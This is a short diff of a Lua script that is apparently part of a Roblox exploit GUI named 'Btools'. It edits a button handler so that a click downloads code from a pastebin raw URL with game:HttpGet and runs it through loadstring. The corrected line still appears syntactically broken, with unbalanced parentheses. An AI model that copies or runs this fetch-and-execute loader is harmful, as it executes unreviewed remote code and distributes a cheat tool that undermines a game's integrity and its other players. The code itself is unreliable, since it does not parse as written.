@@ -585,7 +585,7 @@ local function LYTY_fake_script() -- Btools.Script
 	script.Parent.MouseButton1Down:Connect(function()
 
 
-		loadstring(game:HttpGet('loadstring(game:HttpGet(('https://pastebin.com/raw/F5vSFHZt'),true))()',true))()
+		loadstring(game:HttpGet('https://pastebin.com/raw/F5vSFHZt'),true))()
 
 
 	end)
